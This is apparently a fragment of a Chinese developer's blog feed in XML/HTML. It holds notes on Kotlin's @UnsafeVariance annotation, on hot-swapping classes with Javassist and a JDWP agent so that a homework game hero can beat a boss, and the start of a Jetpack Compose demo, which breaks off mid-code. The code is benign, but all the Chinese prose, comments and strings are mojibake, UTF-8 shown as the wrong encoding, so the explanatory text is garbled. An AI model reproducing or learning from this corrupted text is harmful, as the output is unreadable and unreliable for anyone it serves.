title="@UnsafeVarianceæ³¨è§£"></a>@UnsafeVarianceæ³¨è§£</h2><p>åœ¨ä½ è¿åäº†åå˜/é€†å˜çš„çº¦å®šæ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ³¨è§£è®©ç¼–è¯‘é€šè¿‡</p><p>ä½†æ­£å¦‚å®ƒçš„å­—é¢æ„æ€ï¼Œ<strong>å®ƒä¸å®‰å…¨</strong></p><p>åœ¨è¿«ä¸å¾—å·²è¦ä½¿ç”¨å®ƒçš„æƒ…å†µä¸‹ï¼Œä½ å¿…é¡»æ¸…æ¥šä½ åœ¨åšä»€ä¹ˆ</p><h3 id="ä½¿ç”¨ç¤ºä¾‹-1"><a href="#ä½¿ç”¨ç¤ºä¾‹-1" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> Data<span class="token operator">&lt;</span><span class="token keyword">out</span> T<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> T<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// ä¸åˆæ³•ï¼Œå› ä¸ºå¤–éƒ¨å¯ä»¥è®¿é—®å¹¶ä¿®æ”¹è¿™ä¸ªå˜é‡</span>    <span class="token comment">// ä½¿ç”¨@UnsafeVarianceæ³¨è§£ï¼Œç¼–è¯‘é€šè¿‡</span>    <span class="token keyword">var</span> value<span class="token operator">:</span> <span class="token annotation builtin">@UnsafeVariance</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// åˆæ³•ï¼Œå¤–éƒ¨æ— æ³•è®¿é—®è¿™ä¸ªå˜é‡</span>    <span class="token keyword">private</span> <span class="token keyword">var</span> value2<span class="token operator">:</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// åˆæ³•ï¼Œå› ä¸ºè¿™æ˜¯å¸¸é‡ï¼Œå¸¸é‡å€¼æ— æ³•è¢«ä¿®æ”¹</span>    <span class="token keyword">val</span> value3<span class="token operator">:</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// ä¸åˆæ³•ï¼Œå› ä¸ºåå˜è§„å®šäº†ä¸èƒ½åœ¨æ–¹æ³•å‚æ•°ä¸­ä½¿ç”¨æ³›å‹</span>    <span class="token comment">// ä½¿ç”¨@UnsafeVarianceæ³¨è§£ï¼Œç¼–è¯‘é€šè¿‡</span>    <span class="token keyword">fun</span> <span class="token function">func</span><span class="token punctuation">(</span>input<span class="token operator">:</span> <span class="token annotation builtin">@UnsafeVariance</span> T<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment">// è¿™æ ·åšæ˜¯åˆæ³•çš„ï¼Œæ–¹æ³•çš„è¿”å›å€¼å¯ä»¥ä½¿ç”¨æ³›å‹</span>    <span class="token keyword">fun</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> T <span class="token punctuation">{</span>        <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></b>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨Javassist &amp; Javagentå®ç°ç±»çš„çƒ­æ›¿æ¢</title>
      <link href="/2022/09/03/javassist-hotswap/"/>
      <url>/2022/09/03/javassist-hotswap/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆ©ç”¨Javassist-amp-Javagentå®ç°ç±»çš„çƒ­æ›¿æ¢"><a href="#åˆ©ç”¨Javassist-amp-Javagentå®ç°ç±»çš„çƒ­æ›¿æ¢" class="headerlink" title="åˆ©ç”¨Javassist &amp; Javagentå®ç°ç±»çš„çƒ­æ›¿æ¢"></a>åˆ©ç”¨Javassist &amp; Javagentå®ç°ç±»çš„çƒ­æ›¿æ¢</h1><blockquote><p>å‡ å¤©å‰å†™çº¢å²©ä½œä¸šçš„æ—¶å€™ï¼Œå‘ç°å…¶ä¸­çš„ä¸€ä¸ªleveléå¸¸æœ‰æ„æ€</p><p>è®©æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªHeroç±»ï¼Œå†å®šä¹‰ä¸€ä¸ªBossç±»ã€‚è®¾å®šBossçš„å±æ€§è¿œå¤§äºHeroï¼ŒHeroç»æ— æˆ˜èƒœBossçš„å¯èƒ½æ€§</p><p>ä½œä¸šè¦æ±‚æ˜¯è®©æˆ‘ä»¬ç»™Heroå¼€ä¸ªæŒ‚ï¼Œç§’æ€Boss</p><p>å‡ºè¿™ä¸ªä½œä¸šçš„å­¦é•¿å¤§æ¦‚åªæ˜¯æƒ³è€ƒå¯Ÿæˆ‘ä»¬å¯¹åå°„çš„æŒæ¡ç¨‹åº¦ï¼Œä½†æˆ‘å‘ç°è¿™ä¸ªä½œä¸šå¯ä»¥æ•´èŠ±æ´»ï¼ˆå› ä¸ºå‰æ®µæ—¶é—´ç ”ç©¶äº†ASMå’ŒJavassistï¼‰</p><p>åŒæ—¶æˆ‘ä¹Ÿæƒ³å€Ÿè¿™ä¸ªæœºä¼šè§£å†³æˆ‘ä¹‹å‰ç ”ç©¶Javassistæ—¶ç¢°åˆ°çš„ç–‘æƒ‘</p><p>äºæ˜¯å°±æœ‰äº†è¿™ç¯‡æ–‡ç« </p></blockquote><h2 id="Javassistå¯¹çƒ­æ›¿æ¢çš„å®ç°æ–¹å¼"><a href="#Javassistå¯¹çƒ­æ›¿æ¢çš„å®ç°æ–¹å¼" class="headerlink" title="Javassistå¯¹çƒ­æ›¿æ¢çš„å®ç°æ–¹å¼"></a>Javassistå¯¹çƒ­æ›¿æ¢çš„å®ç°æ–¹å¼</h2><p>æˆ‘ä¹‹å‰ç ”ç©¶äº†å¾ˆä¹…ï¼Œåˆ°å¤„æ‰¾èµ„æ–™ä¹Ÿæ²¡ç ”ç©¶å‡ºæ¥æ€ä¹ˆæ•´ã€‚ä¸è¿‡è¿™æ¬¡æˆ‘ç»ˆäºåœ¨ç½‘ç»œä¸Šæ‰¾åˆ°äº†çº¿ç´¢ï¼Œå¹¶ä¸”åˆæ­¥äº†è§£äº†å®ƒçš„åŸç†ã€‚</p><blockquote><p>æ­£å¸¸æ¥è¯´ï¼Œåªé Javaä»£ç æ˜¯æ²¡æ³•æ›¿æ¢ä¸€ä¸ªå·²ç»åŠ è½½åˆ°SystemClassLoaderé‡Œçš„ç±»çš„ã€‚ï¼ˆå¦‚æœæ˜¯åˆ«çš„ClassLoaderåŠ è½½çš„ç±»ï¼Œä¹Ÿè®¸å¯ä»¥è®©åŠ è½½è¿™ä¸ªç±»çš„ClassLoaderä¸å¯è¾¾å†æ‰‹åŠ¨è°ƒç”¨gcæ¥è¾¾åˆ°è®©è¿™ä¸ªç±»è¢«ä½œä¸ºåƒåœ¾å›æ”¶çš„ç›®çš„æ¥åˆ é™¤ä¸€ä¸ªç±»ï¼‰ä½†ä¸€ä¸²ç¥å¥‡çš„VM Optionsè®©æˆ‘ä»¬æ‹¥æœ‰äº†ä»ä»£ç å±‚é¢è¦†å†™ä¸€ä¸ªç±»çš„èƒ½åŠ›ã€‚</p></blockquote><pre class="line-numbers language-none"><code class="language-none">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯¹äºè¿™è¡Œoptionsçš„ä½œç”¨æˆ‘å¹¶ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œä½†å®ƒç¡®å®è®©Javassistçš„Hotswapperç±»æœ‰äº†è¿æ¥VMçš„èƒ½åŠ›ï¼Œä»æ­¤çƒ­è¦†å†™ä¸€ä¸ªç±»çš„å­—èŠ‚ç ä¾¿ä»æŠ€æœ¯å±‚é¢å¯è¡Œäº†ã€‚</p><p>ç¾ä¸­ä¸è¶³çš„æ˜¯åªæœ‰åŠ äº†è¿™è¡ŒOptionsæ‰èƒ½è¾¾åˆ°æ•ˆæœ</p><h2 id="å…³é”®ä»£ç "><a href="#å…³é”®ä»£ç " class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h2><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">/** * hk.asgard.rain.lesson4.Lv4 * 4thWork * ä¸‰ç§å¼€æŒ‚è§£å†³æ–¹æ¡ˆ * åå°„ javassistç”Ÿæˆæ–°ç±» çƒ­æ›¿æ¢ * * @author å¯’é›¨ * @since 2021/11/18 10:58 **/</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> hero<span class="token operator">:</span> Entity <span class="token operator">=</span> <span class="token function">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> boss <span class="token operator">=</span> <span class="token function">Boss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//    bypass(hero)</span><span class="token comment">//    hero = javassistByPass(hero)</span>    <span class="token function">hotSwap</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>boss<span class="token punctuation">.</span>speed <span class="token operator">&gt;</span> hero<span class="token punctuation">.</span>speed<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// Boss å…ˆæ‰‹ ç§’æ€</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è‹±é›„è¢«Bossç§’æ€å•¦"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment">// hero å…ˆæ‰‹</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hero<span class="token punctuation">.</span>damage <span class="token operator">&gt;=</span> boss<span class="token punctuation">.</span>health<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è‹±é›„å¼€æŒ‚ç§’æ€äº†Boss"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è‹±é›„å…ˆæ‰‹æ²¡èƒ½å¹²æ‰Bossï¼Œè¢«Bossåæ€"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/** * å¼€æŒ‚(åå°„) */</span><span class="token keyword">fun</span> <span class="token function">bypass</span><span class="token punctuation">(</span>hero<span class="token operator">:</span> Entity<span class="token punctuation">)</span> <span class="token punctuation">{</span>    hero<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"damage"</span><span class="token punctuation">,</span> <span class="token number">999999</span><span class="token punctuation">)</span>    hero<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"speed"</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// ç”¨javassistç”Ÿæˆæ–°ç±»å¹¶åŠ è½½</span><span class="token keyword">fun</span> <span class="token function">javassistByPass</span><span class="token punctuation">(</span>hero<span class="token operator">:</span> Entity<span class="token punctuation">)</span><span class="token operator">:</span> Entity <span class="token punctuation">{</span>    <span class="token comment">// è·å–ctClass</span>    <span class="token keyword">val</span> ctClass <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"hk.asgard.rain.lesson4.lv4.Hero"</span><span class="token punctuation">)</span>    <span class="token comment">// æ”¹åï¼Œå¦åˆ™é‡å¤åŠ è½½ä¼šæŠ›å¼‚å¸¸</span>    ctClass<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"hk.asgard.rain.lesson4.lv4.HeroEdited"</span>    <span class="token comment">// ä»ctClassè·å–æ–¹æ³•</span>    <span class="token keyword">val</span> ctMethodDamage <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getDamage"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> ctMethodSpeed <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getSpeed"</span><span class="token punctuation">)</span>    ctMethodDamage<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token raw-string string">"""{        return 999999L;    }"""</span><span class="token punctuation">)</span>    ctMethodSpeed<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token raw-string string">"""{        return 400;    }"""</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> Entity<span class="token punctuation">}</span><span class="token comment">// çƒ­æ›¿æ¢</span><span class="token comment">// éœ€è¦jvmé€‰é¡¹ -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 å¹¶ä¸”implementation tools.jar</span><span class="token keyword">fun</span> <span class="token function">hotSwap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// è·å–ctClass</span>    <span class="token keyword">val</span> ctClass <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"hk.asgard.rain.lesson4.lv4.Hero"</span><span class="token punctuation">)</span>    <span class="token comment">// ä»ctClassè·å–æ–¹æ³•</span>    <span class="token keyword">val</span> ctMethodDamage <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getDamage"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> ctMethodSpeed <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getSpeed"</span><span class="token punctuation">)</span>    ctMethodDamage<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token raw-string string">"""{        return 999999L;    }"""</span><span class="token punctuation">)</span>    ctMethodSpeed<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token raw-string string">"""{        return 400;    }"""</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> swap <span class="token operator">=</span> <span class="token function">HotSwapper</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span>    swap<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token string">"hk.asgard.rain.lesson4.lv4.Hero"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><blockquote><p>ä½¿ç”¨HotSwapperä¸æ­¢éœ€è¦å¯¼å…¥Javassiståº“ï¼Œè¿˜éœ€è¦å¯¼å…¥tools.jar</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
            <tag> å¤–éƒ¨åº“ </tag>
            
            <tag> å­—èŠ‚ç æ“ä½œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆè¯•Jetpack Compose</title>
      <link href="/2022/09/03/jetpack-compose-test/"/>
      <url>/2022/09/03/jetpack-compose-test/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆè¯•Jetpack-Compose"><a href="#åˆè¯•Jetpack-Compose" class="headerlink" title="åˆè¯•Jetpack Compose"></a>åˆè¯•Jetpack Compose</h1><p>ä»Šå¤©å†™WanAndroidå†™å¾—å¤´æ™•ç›®çœ©ï¼Œä¾¿æƒ³æ¢æ¢è„‘å­å­¦ç‚¹åˆ«çš„ä¸œè¥¿ï¼Œäºæ˜¯æˆ‘å»äº†è§£äº†ä¸€ä¸‹<em><strong>Jetpack Compose</strong></em>ã€‚å¹¶å°è¯•ç”¨å®ƒä»¿å†™äº†Github Appçš„éƒ¨åˆ†å†…å®¹ã€‚</p><p>æˆ‘ä¸€å‘æ˜¯å¯¹DSLé£æ ¼çš„ç¼–ç¨‹ååˆ†å‘å¾€çš„ï¼Œå› ä¸ºæˆ‘æ„Ÿè§‰è¿™æ ·å†™ä»£ç å°±è·Ÿå†™è¯—ä¸€æ ·ä¼˜é›…ã€‚è€ŒUIç¼–ç¨‹å…¶å®ä¸€ç›´æ˜¯æˆ‘çš„ç—›ç‚¹ã€‚æ›¾ç»åœ¨Minecraftæ’ä»¶å¼€å‘ä¸­ï¼Œæˆ‘æ˜¯å¾ˆä¸æ“…é•¿ç¼–å†™UIçš„ã€‚æ‰€å¹¸Androidæä¾›äº†ä¸€å¥—xmlè¯­æ³•ç³–æ¥å°†å¤§éƒ¨åˆ†UIé€»è¾‘ä¸é€»è¾‘ä»£ç åˆ†ç¦»ï¼Œè®©æˆ‘å¯¹Androidçš„uiå¼€å‘è¿˜ç®—å¾—å¿ƒåº”æ‰‹ï¼Œä½†æˆ‘ä»ç„¶ååˆ†å‘å¾€ä½¿ç”¨é€»è¾‘ä»£ç æ¥æ„é€ UIç•Œé¢ã€‚äºæ˜¯æˆ‘å¬è¯´äº†Jetpack Composeï¼Œä¸€ç§ä½¿ç”¨DSLé£æ ¼çš„Jetpack UIæ¡†æ¶ï¼Œç›´æ¥æˆ³çˆ†äº†æˆ‘ã€‚</p><p>äºæ˜¯åœ¨ä¸€ä¸ªä¸Šåˆï¼Œæˆ‘è¢«æˆ‘å†™çš„WanAndroidçš„ä»£ç æ¶å¿ƒå¾—æ­»å»æ´»æ¥ï¼Œæ°”å¾—å…³é—­äº†Android Studioã€‚æƒ³ç€åˆ·åˆ·æ˜é‡‘ï¼Œçœ‹åˆ°äº†ä¸€ç¯‡Composeçš„æ–‡ç« ï¼Œäºæ˜¯å°±å­¦äº†ä¸€ä¸Šåˆçš„Composeï¼Œç„¶åæœ‰äº†è¿™ä¸ªdemoã€‚</p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> MainActivity <span class="token operator">:</span> <span class="token function">ComponentActivity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token operator">:</span> Bundle<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span>        setContent <span class="token punctuation">{</span>            <span class="token function">ComposeTestTheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation builtin">@Composable</span>    <span class="token keyword">fun</span> <span class="token function">Main</span><span class="token punctuation">(</span>        avatar<span class="token operator">:</span> String <span class="token operator">=</span> <span class="token string">"https://gitee.com/coldrain-moro/images_bed/raw/master/images/chino.jpg"</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> selectedItem <span class="token keyword">by</span> remember <span class="token punctuation">{</span> <span class="token function">mutableStateOf</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>        <span class="token keyword">val</span> items <span class="token operator">=</span> <span class="token function">listOf</span><span class="token punctuation">(</span><span class="token string">"ä¸»é¡µ"</span><span class="token punctuation">,</span> <span class="token string">"é€šçŸ¥"</span><span class="token punctuation">,</span> <span class="token string">"æœç´¢"</span><span class="token punctuation">)</span>        <span class="token function">Scaffold</span><span class="token punctuation">(</span>            bottomBar <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token function">BottomNavigation</span><span class="token punctuation">(</span>                    backgroundColor <span class="token operator">=</span> Color<span class="token punctuation">.</span>White<span class="token punctuation">,</span>                    modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">height</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                <span class="token punctuation">)</span> <span class="token punctuation">{</span>                    items<span class="token punctuation">.</span><span class="token function">forEachIndexed</span> <span class="token punctuation">{</span> index<span class="token punctuation">,</span> item <span class="token operator">-&gt;</span>                        <span class="token function">BottomNavigationItem</span><span class="token punctuation">(</span>                            icon <span class="token operator">=</span> <span class="token punctuation">{</span>                                <span class="token keyword">when</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">{</span>                                    <span class="token number">0</span> <span class="token operator">-&gt;</span> <span class="token function">Icon</span><span class="token punctuation">(</span>Icons<span class="token punctuation">.</span>Filled<span class="token punctuation">.</span>Home<span class="token punctuation">,</span> contentDescription <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>                                    <span class="token number">1</span> <span class="token operator">-&gt;</span> <span class="token function">Icon</span><span class="token punctuation">(</span>Icons<span class="token punctuation">.</span>Filled<span class="token punctuation">.</span>Notifications<span class="token punctuation">,</span> contentDescription <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>                                    <span class="token keyword">else</span> <span class="token operator">-&gt;</span> <span class="token function">Icon</span><span class="token punctuation">(</span>Icons<span class="token punctuation">.</span>Filled<span class="token punctuation">.</span>Search<span class="token punctuation">,</span> contentDescription <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>                                <span class="token punctuation">}</span>                            <span class="token punctuation">}</span><span class="token punctuation">,</span>                            label <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token function">Text</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>                            selected <span class="token operator">=</span> selectedItem <span class="token operator">==</span> index<span class="token punctuation">,</span>                            onClick <span class="token operator">=</span> <span class="token punctuation">{</span> selectedItem <span class="token operator">=</span> index <span class="token punctuation">}</span><span class="token punctuation">,</span>                        <span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">Column</span><span class="token punctuation">(</span>                Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>            <span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">Row</span><span class="token punctuation">(</span>                    verticalAlignment <span class="token operator">=</span> Alignment<span class="token punctuation">.</span>CenterVertically                <span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">Surface</span><span class="token punctuation">(</span>                        shape <span class="token operator">=</span> CircleShape<span class="token punctuation">,</span>                    <span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token function">Image</span><span class="token punctuation">(</span>                            painter <span class="token operator">=</span> <span class="token function">rememberImagePainter</span><span class="token punctuation">(</span><span class="token keyword">data</span> <span class="token operator">=</span> avatar<span class="token punctuation">)</span><span class="token punctuation">,</span>                            contentDescription <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>                            modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span><span class="token punctuation">,</span>                            contentScale <span class="token operator">=</span> ContentScale<span class="token punctuation">.</span>Crop                        <span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                    <span class="token function">Text</span><span class="token punctuation">(</span>                        text <span class="token operator">=</span> <span class="token string">"ä¸»é¡µ"</span><span class="token punctuation">,</span>                        style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                            fontWeight <span class="token operator">=</span> FontWeight<span class="token punctuation">.</span>Bold<span class="token punctuation">,</span>                            fontSize <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">.</span>sp                        <span class="token punctuation">)</span><span class="token punctuation">,</span>                        modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                    <span class="token punctuation">)</span>                <span class="token punctuation">}</span>                <span class="token function">Text</span><span class="token punctuation">(</span>                    text <span class="token operator">=</span> <span class="token string">"æˆ‘çš„å·¥ä½œ"</span><span class="token punctuation">,</span>                    style <span class="token operator">=</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>                        fontWeight <span class="token operator">=</span> FontWeight<span class="token punctuation">.</span>Bold<span class="token punctuation">,</span>                        fontSize <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">.</span>sp                    <span class="token punctuation">)</span><span class="token punctuation">,</span>                    modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>top <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">.</span>dp<span class="token punctuation">,</span> bottom <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                <span class="token punctuation">)</span>                <span class="token function">WorkSelection</span><span class="token punctuation">(</span>icon <span class="token operator">=</span> R<span class="token punctuation">.</span>drawable<span class="token punctuation">.</span>ic_issue_opened<span class="token punctuation">,</span> text <span class="token operator">=</span> <span class="token string">"è®®é¢˜"</span><span class="token punctuation">,</span> <span class="token function">Color</span><span class="token punctuation">(</span><span class="token number">0xFF25CA25</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">WorkSelection</span><span class="token punctuation">(</span>icon <span class="token operator">=</span> R<span class="token punctuation">.</span>drawable<span class="token punctuation">.</span>ic_pull_request<span class="token punctuation">,</span> text <span class="token operator">=</span> <span class="token string">"æ‹‰å–è¯·æ±‚"</span><span class="token punctuation">,</span> <span class="token function">Color</span><span class="token punctuation">(</span><span class="token number">0xFF11ABF1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">WorkSelection</span><span class="token punctuation">(</span>icon <span class="token operator">=</span> R<span class="token punctuation">.</span>drawable<span class="token punctuation">.</span>ic_git_repository_line<span class="token punctuation">,</span> text <span class="token operator">=</span> <span class="token string">"ä»“åº“"</span><span class="token punctuation">,</span> <span class="token function">Color</span><span class="token punctuation">(</span><span class="token number">0xFF8811F1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">WorkSelection</span><span class="token punctuation">(</span>icon <span class="token operator">=</span> R<span class="token punctuation">.</span>drawable<span class="token punctuation">.</span>ic_organization<span class="token punctuation">,</span> text <span class="token operator">=</span> <span class="token string">"ç»„ç»‡"</span><span class="token punctuation">,</span> <span class="token function">Color</span><span class="token punctuation">(</span><span class="token number">0xFFF18C11</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">Divider</span><span class="token punctuation">(</span>                    color <span class="token operator">=</span> Color<span class="token punctuation">.</span>Gray<span class="token punctuation">,</span>                    modifier <span class="token operator">=</span> Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>top <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">.</span>dp<span class="token punctuation">)</span>                <span class="token punctuation">)</span>                    <span class="token function">Column</span><span class="token punctuation">(</span>                        Modifier<span class="token punctuation">.</span><span class="token function">padding</span><span class="token punctuation">(</span>vertical <span class="token operator">=</span> <span class="token 